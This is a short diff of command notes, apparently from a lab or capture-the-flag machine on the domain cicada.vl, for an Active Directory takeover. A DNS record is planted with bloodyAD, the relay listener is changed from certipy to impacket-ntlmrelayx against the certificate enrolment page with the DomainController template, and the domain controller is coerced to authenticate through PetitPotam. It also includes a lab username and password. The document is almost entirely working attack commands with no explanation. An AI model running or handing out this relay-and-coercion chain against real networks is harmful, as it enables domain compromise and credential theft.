@@ -4,7 +4,11 @@
 bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <KALI IP>
 
 // Set Listener
-certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
+impacket-ntlmrelayx \
+  -t http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp \
+  --adcs \
+  --template DomainController \
+  -smb2support
 
 // Coercion
 nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
